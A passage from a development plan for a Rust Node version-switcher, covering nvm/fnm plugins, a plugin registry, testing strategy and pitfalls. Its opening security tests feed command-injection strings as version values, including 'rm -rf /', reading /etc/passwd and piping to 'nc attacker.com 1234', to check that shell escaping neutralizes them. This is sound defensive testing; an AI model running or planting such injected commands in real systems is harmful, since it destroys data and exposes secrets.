   fn test_nvm_shell_escaping() {
       let plugin = NvmPlugin::new();

       let dangerous_inputs = vec![
           ("18.20.0; rm -rf /", ";"),
           ("18.20.0 && cat /etc/passwd", "&&"),
           ("18.20.0 | nc attacker.com 1234", "|"),
           ("18.20.0`whoami`", "`"),
           ("18.20.0$(whoami)", "$"),
       ];

       for (input, dangerous_char) in dangerous_inputs {
           let activate = plugin.activate_command(input).unwrap();
           let install = plugin.install_command(input).unwrap();

           // Verify the command starts with the expected prefix
           assert!(activate.starts_with("nvm use "),
                   "Expected 'nvm use' prefix, got: {}", activate);
           assert!(install.starts_with("nvm install "),
                   "Expected 'nvm install' prefix, got: {}", install);

           // Extract the version part after the command
           let activate_version = activate.strip_prefix("nvm use ").unwrap();
           let install_version = install.strip_prefix("nvm install ").unwrap();

           // Verify the dangerous input is quoted (shell-escape wraps in single quotes)
           assert!(activate_version.starts_with("'") && activate_version.ends_with("'"),
                   "Version should be single-quoted in activate: {}", activate);
           assert!(install_version.starts_with("'") && install_version.ends_with("'"),
                   "Version should be single-quoted in install: {}", install);

           // Verify the dangerous character is inside the quotes (neutralized)
           assert!(activate_version.contains(dangerous_char),
                   "Dangerous char '{}' should be present but quoted in: {}",
                   dangerous_char, activate);
       }
   }

   #[test]
   fn test_fnm_shell_escaping() {
       let plugin = FnmPlugin::new();

       let dangerous_inputs = vec![
           ("18.20.0; rm -rf /", ";"),
           ("18.20.0 && cat /etc/passwd", "&&"),
       ];

       for (input, dangerous_char) in dangerous_inputs {
           let activate = plugin.activate_command(input).unwrap();
           let install = plugin.install_command(input).unwrap();

           // Verify command prefixes
           assert!(activate.starts_with("fnm use "),
                   "Expected 'fnm use' prefix, got: {}", activate);
           assert!(install.starts_with("fnm install "),
                   "Expected 'fnm install' prefix, got: {}", install);

           // Extract version parts
           let activate_version = activate.strip_prefix("fnm use ").unwrap();
           let install_version = install.strip_prefix("fnm install ").unwrap();

           // Verify proper quoting
           assert!(activate_version.starts_with("'") && activate_version.ends_with("'"),
                   "Version should be single-quoted in activate: {}", activate);
           assert!(install_version.starts_with("'") && install_version.ends_with("'"),
                   "Version should be single-quoted in install: {}", install);

           // Verify dangerous character is neutralized
           assert!(activate_version.contains(dangerous_char),
                   "Dangerous char '{}' should be present but quoted in: {}",
                   dangerous_char, activate);
       }
   }
   ```

**Code Structure:**

- **File**: `src/plugins/mock.rs`
  - `MockPlugin` for testing
  - Configurable availability and versions

- **File**: `tests/plugin_test.rs`
  - Tests for mock plugin functionality
  - Integration tests for plugin priority
  - Command injection prevention tests

- **File**: `tests/security_test.rs`
  - Dedicated security tests for shell escaping
  - Tests with malicious version strings

**Key Considerations:**

- **Mock plugin limitations**: Can't inject mocks into PluginRegistry easily without refactoring
- **Security testing**: Critical to verify shell escaping works correctly
- **Integration vs unit**: Some tests require actual nvm/fnm installed, mark as `#[ignore]` if not available
- **Test coverage**: Aim for >85% coverage as specified in success criteria

**Testing:**

Run all tests with:
```bash
cargo test
cargo test -- --ignored  # Run integration tests that require nvm/fnm
```

**Dependencies:**

- **Requires**: M2.1, M2.2, M2.3, M2.4 (all previous tasks)
- **Enables**: Milestone completion

---

## Integration Points

### With Milestone 1 (Core Infrastructure)

- **Config**: Registry uses `config.plugins` for priority ordering
- **CLI**: Activate command integrates registry and plugins
- **Version File**: Plugins receive version strings from version file detection
- **Error Handling**: Plugins use `XvnError` types where appropriate

### With Milestone 3 (Shell Integration)

- **Command Generation**: Plugin commands will be written to file descriptor #3
- **Activation**: Shell hooks will execute commands returned by plugins
- **Setup**: Setup command will need plugin availability checks

### With Milestone 4 (Version Activation)

- **Auto-Install**: Will use `plugin.install_command()` for prompts
- **Version Resolution**: Will use `plugin.resolve_version()` for aliases
- **Plugin Selection**: Will use `registry.find_plugin_with_version()`

---

## Testing Strategy

### Unit Tests (Fast)

- Plugin trait implementation for nvm and fnm
- Command generation and escaping
- Registry priority ordering
- Mock plugin behavior

### Integration Tests (Slow)

- Actual nvm/fnm availability detection (mark `#[ignore]` if not installed)
- Version checking with real version managers
- Command execution (dry-run mode)

### Security Tests (Critical)

- Shell injection prevention
- Malicious version strings
- Command escaping validation

### Test Coverage Goals

- >85% line coverage for plugin module
- 100% coverage for security-critical code (escaping)
- All error paths tested

---

## Success Criteria

### Functional Requirements

- ✅ nvm plugin correctly detects nvm availability
- ✅ fnm plugin correctly detects fnm availability
- ✅ Plugins loaded in correct priority order from config
- ✅ Commands generated with proper shell escaping
- ✅ Registry finds first available plugin
- ✅ Registry finds plugin with specific version installed

### Testing Requirements

- ✅ Mock plugin enables isolated testing
- ✅ All unit tests passing
- ✅ Security tests verify no command injection
- ✅ Coverage >85% for plugins module

### Quality Requirements

- ✅ No clippy warnings
- ✅ Code properly formatted with rustfmt
- ✅ Comprehensive documentation in code
- ✅ Clear error messages for common failures

### Integration Requirements

- ✅ CLI activate command uses plugin registry
- ✅ Config plugin list respected
- ✅ Version file detection integrated with plugins
- ✅ Status command shows available plugins

---

## Common Pitfalls & Solutions

### Pitfall 1: Command Injection Vulnerability

**Problem**: Concatenating version strings directly into shell commands.

**Solution**: Always use `shell-escape` crate for version strings.

```rust
// ❌ WRONG - Vulnerable to injection
format!("nvm use {}", version)

// ✅ CORRECT - Safe with escaping
let escaped = shell_escape::escape(version.into());
format!("nvm use {}", escaped)
```

### Pitfall 2: Availability Caching Race Conditions

**Problem**: Multiple threads checking availability simultaneously.

**Solution**: Use `Arc<Mutex<Option<bool>>>` for thread-safe caching.

### Pitfall 3: nvm Not Found

**Problem**: nvm is a bash function, not a binary - can't execute directly.

**Solution**: Source nvm.sh first, then run nvm commands:
```bash
bash -c "source ~/.nvm/nvm.sh && nvm use 18.20.0"
```

### Pitfall 4: Registry Can't Use Mock Plugins

**Problem**: `PluginRegistry::new()` hardcodes built-in plugins.

**Solution**: Accept this limitation for MVP. In future, refactor to dependency injection pattern or trait object factory.

---

## File Checklist

After completing this milestone, verify these files exist:

```
src/plugins/
├── mod.rs          ✅ Module exports
├── trait_def.rs    ✅ VersionManagerPlugin trait
├── nvm.rs          ✅ NVM plugin implementation
├── fnm.rs          ✅ FNM plugin implementation
├── registry.rs     ✅ Plugin registry
└── mock.rs         ✅ Mock plugin for testing

tests/
├── plugin_test.rs  ✅ Integration tests
└── security_test.rs ✅ Security tests

Cargo.toml          ✅ shell-escape dependency added
src/lib.rs          ✅ Plugins module exported
src/cli.rs          ✅ Activate command uses plugins
```

---

## Next Steps

After Milestone 2 is complete:

1. **Verify all tests pass**: `cargo test`
2. **Check coverage**: `cargo tarpaulin` (>85%)
3. **Manual testing**: Test with actual nvm/fnm installations
4. **Update TASKS.md**: Mark all M2.x tasks as complete
5. **Commit work**: Conventional commit with milestone summary
6. **Proceed to Milestone 3**: Shell Integration (xvn.sh hooks)

---

## References

- [SPEC.md](./SPEC.md) - Milestone 2 specification
- [TASKS.md](./TASKS.md) - Task checklist
- [ARCHITECTURE.md](../../docs/ARCHITECTURE.md) - System architecture
- [Rust Traits Documentation](https://doc.rust-lang.org/book/ch10-02-traits.html)
- [shell-escape crate](https://docs.rs/shell-escape/)
